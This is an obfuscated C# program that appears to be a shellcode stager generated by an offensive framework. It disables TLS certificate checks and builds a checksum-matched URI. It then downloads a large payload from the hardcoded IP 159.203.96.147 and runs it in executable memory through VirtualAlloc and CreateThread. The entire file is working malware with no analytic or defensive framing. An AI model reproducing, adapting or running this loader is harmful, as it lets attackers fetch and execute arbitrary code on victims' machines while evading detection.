using System; using System.Net; using System.Net.Sockets; using System.Linq; using System.Runtime.InteropServices;
namespace lKJYOmT { class ZOsiSVOplvRJw {
private static bool uHHtbkHDFsJIBKS(object sender, System.Security.Cryptography.X509Certificates.X509Certificate cert,System.Security.Cryptography.X509Certificates.X509Chain chain,System.Net.Security.SslPolicyErrors sslPolicyErrors) { return true; }
static string tcwKcVGzic(Random r, int s) {
char[] wmfupmw = new char[s];
string FMnruGXMkVpx = "HNeR2Joigd6GMETWFCPOuL7QSY3V4Dp5frUcyBl1wmqvhn8kaXZIsAtK0jzb9x";
for (int i = 0; i < s; i++){ wmfupmw[i] = FMnruGXMkVpx[r.Next(FMnruGXMkVpx.Length)];}
return new string(wmfupmw);}
static bool EBuvzvVheA(string s) {return ((s.ToCharArray().Select(x => (int)x).Sum()) % 0x100 == 92);}
static string KoTqAbSGwOHrC(Random r) { string mDtlRZ = "";
for (int i = 0; i < 64; ++i) { mDtlRZ = tcwKcVGzic(r, 3);
string XpUzOBYEAYF = new string("zA2iXkUw1EhLV5gFtNxPe7s4CKvRBMlbcmOH8GIaWr6JQdofZSp0yj9uYTDq3n".ToCharArray().OrderBy(s => (r.Next(2) % 2) == 0).ToArray());
for (int j = 0; j < XpUzOBYEAYF.Length; ++j) {
string iVYmfzoZILCUPac = mDtlRZ + XpUzOBYEAYF[j];
if (EBuvzvVheA(iVYmfzoZILCUPac)) {return iVYmfzoZILCUPac;}}} return "9vXU";}static byte[] vTzEdggWSvX(string IhSzqq) {
ServicePointManager.ServerCertificateValidationCallback = uHHtbkHDFsJIBKS;
WebClient UqfwQY = new System.Net.WebClient();
UqfwQY.Headers.Add("User-Agent", "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)");
UqfwQY.Headers.Add("Accept", "*/*");
UqfwQY.Headers.Add("Accept-Language", "en-gb,en;q=0.5");
UqfwQY.Headers.Add("Accept-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.7");
byte[] qgJCTVa = null;
try { qgJCTVa = UqfwQY.DownloadData(IhSzqq);
if (qgJCTVa.Length < 100000) return null;}
catch (WebException) {}
return qgJCTVa;}
static void yPKboOiXHPfGbq(byte[] ZJYLoUGKqvtbXI) {
    if (ZJYLoUGKqvtbXI != null) {
        UInt32 AJQmjwvakRxrrcO = VirtualAlloc(0, (UInt32)ZJYLoUGKqvtbXI.Length, 0x1000, 0x40);
        Marshal.Copy(ZJYLoUGKqvtbXI, 0, (IntPtr)(AJQmjwvakRxrrcO), ZJYLoUGKqvtbXI.Length);
        IntPtr vYrlMGyZWBaPFX = IntPtr.Zero;
        UInt32 nscJkxC = 0;
        IntPtr VERnbzF = IntPtr.Zero;
        vYrlMGyZWBaPFX = CreateThread(0, 0, AJQmjwvakRxrrcO, VERnbzF, 0, ref nscJkxC);
        WaitForSingleObject(vYrlMGyZWBaPFX, 0xFFFFFFFF); }}
static void Main(){
Random PmFdMGTWBMyaJrU = new Random((int)DateTime.Now.Ticks);
byte[] LVXhpo = vTzEdggWSvX("https://159.203.96.147:443/" + KoTqAbSGwOHrC(PmFdMGTWBMyaJrU));
yPKboOiXHPfGbq(LVXhpo);}
[DllImport("kernel32")] private static extern UInt32 VirtualAlloc(UInt32 nqBMTrrf,UInt32 UfQVspcGEKbmNfw, UInt32 qCazBXNZQeuJq, UInt32 VdpAqRggkh);
[DllImport("kernel32")]private static extern IntPtr CreateThread(UInt32 MyGpgx, UInt32 QRlWOFwklXLHjuH, UInt32 BxzAGdjYvAOu,IntPtr vFTsZcoTodqW, UInt32 bDvAFxA, ref UInt32 GmrAZMAnQ);
[DllImport("kernel32")] private static extern UInt32 WaitForSingleObject(IntPtr flkMdBkZZ, UInt32 WvglpSk); } }
